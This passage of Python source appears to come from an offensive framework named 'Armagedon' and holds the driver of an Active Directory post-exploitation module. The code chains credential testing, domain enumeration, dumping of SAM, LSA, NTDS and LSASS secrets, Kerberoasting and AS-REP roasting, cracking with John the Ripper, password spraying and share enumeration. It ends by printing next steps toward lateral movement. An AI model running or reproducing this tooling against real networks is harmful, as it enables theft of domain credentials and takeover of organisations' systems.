        with open(creds_file) as f:
            creds = f.read().strip()
        if creds:
            print(f"\n  All captured credentials:")
            for line in creds.splitlines():
                print(f"    {line}")

    print(f"\n  Next steps:")
    print(f"    1. Check {output_dir} for dumped credentials")
    print(f"    2. Crack remaining hashes: john --format=NT --wordlist=rockyou.txt {hashes_file}")
    print(f"    3. Use cracked creds for lateral movement")
    print(f"    4. Run again with new credentials")


# ─── Module interface ─────────────────────────────────────────────────────────

def check(options=None, target=None, **kwargs):
    """Verify prerequisites."""
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target

    missing = []
    if not _find_nxc():
        missing.append("nxc (NetExec)")
    if not _find_john():
        missing.append("john (John the Ripper)")
    if not _find_impacket("GetUserSPNs"):
        missing.append("impacket-GetUserSPNs")

    if missing:
        return False, f"Missing tools: {', '.join(missing)}"

    return True, f"DC: {opts.get('RHOSTS', 'not set')}, Tools: nxc, john, impacket"


def run(options=None, target=None, mode="CHECK", **kwargs):
    """Execute AD post-exploitation enumeration.

    Modes:
        CHECK  — verify tools and validate options
        EXPLOIT — run the full enumeration loop (non-destructive)
    """
    global OPTIONS
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target
    OPTIONS.update(opts)

    rhosts = opts.get("RHOSTS", "")
    user = opts.get("USERNAME", "")
    passwd = opts.get("PASSWORD", "")
    domain = opts.get("DOMAIN", "")
    verbose = opts.get("VERBOSE", False)

    log.info(f"ad_post_enum run target={rhosts} mode={mode}")

    if not rhosts or not user or not passwd or not domain:
        return {"success": False, "error": "RHOSTS, USERNAME, PASSWORD, DOMAIN all required"}

    if mode.upper() == "CHECK":
        ok, msg = check(opts, target)
        return {"success": ok, "message": msg, "tools": msg}

    # Generate output directory
    output_dir = opts.get("OUTPUT_DIR", "")
    if not output_dir:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = os.path.join(os.getcwd(), f"ad_enum_{ts}")
    os.makedirs(output_dir, exist_ok=True)
    hash_file = os.path.join(output_dir, "all_hashes.txt")
    if not os.path.exists(hash_file):
        open(hash_file, "w").close()

    print(f"\n{'#'*60}")
    print(f"  Armagedon — AD Post-Exploitation Enumeration")
    print(f"  Target:  {rhosts}")
    print(f"  Domain:  {domain}")
    print(f"  User:    {domain}\\{user}")
    print(f"  Output:  {output_dir}")
    print(f"{'#'*60}")

    steps_str = opts.get("STEPS", "TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY,SHARE")
    steps = [s.strip().upper() for s in steps_str.split(",")]

    result = {
        "success": True,
        "target": rhosts,
        "domain": domain,
        "output_dir": output_dir,
        "stages": {},
    }

    # Step 1: Test credentials
    if "TEST" in steps:
        svc_result = _test_credentials(rhosts, user, passwd, domain, output_dir)
        result["stages"]["test"] = svc_result
        if not svc_result["any_pwnd"]:
            print(f"\n  [-] Credentials don't work on any service — aborting")
            result["success"] = False
            _print_summary(output_dir, domain)
            return result
        working_user = svc_result["working_user"]
    else:
        working_user = user

    # Step 2: Full enumeration
    if "ENUM" in steps:
        enum_result = _full_enum(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["enum"] = enum_result

    # Step 3: Credential dump
    if "DUMP" in steps:
        creds = _dump_creds(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["dump"] = {
            "sam": len(creds.get("sam", [])),
            "lsa": len(creds.get("lsa", [])),
            "ntds": len(creds.get("ntds", [])),
            "lsass": len(creds.get("lsass", [])),
        }

    # Step 4: LDAP enumeration
    if "LDAP" in steps:
        ldap_result = _ldap_enum(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["ldap"] = {k: len(v) for k, v in ldap_result.items()}

    # Step 5: Kerberoast + AS-REP
    if "KERB" in steps:
        kerb_file = _kerberoast(rhosts, working_user, passwd, domain, output_dir)
        asrep_file = _asreproast(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["kerb"] = {
            "kerberoast": kerb_file or None,
            "asrep": asrep_file or None,
        }

    # Step 6: Crack hashes
    if "CRACK" in steps:
        wordlist = opts.get("WORDLIST", "/usr/share/wordlists/rockyou.txt")
        cracked = _crack_hashes(output_dir, wordlist)
        result["stages"]["crack"] = {
            "ntlm": len(cracked.get("ntlm", [])),
            "kerb": len(cracked.get("kerb", [])),
        }

    # Step 7: Password spray
    if "SPRAY" in steps:
        spray_result = _password_spray(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["spray"] = {"valid": len(spray_result)}

    # Step 8: Test cracked passwords
    cracked_file = os.path.join(output_dir, "cracked_ntlm.txt")
    if os.path.exists(cracked_file) and os.path.getsize(cracked_file) > 0:
        with open(cracked_file) as f:
            cracked_lines = [l.strip() for l in f if l.strip()]
        if cracked_lines:
            tested = _test_cracked(rhosts, cracked_lines, domain, output_dir)
            result["stages"]["test_cracked"] = {"tested": tested}

    # Step 9: Shared drives enumeration
    if "SHARE" in steps:
        share_result = _enumerate_shares(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["shares"] = share_result

    _print_summary(output_dir, domain)

    result["success"] = True
    return result
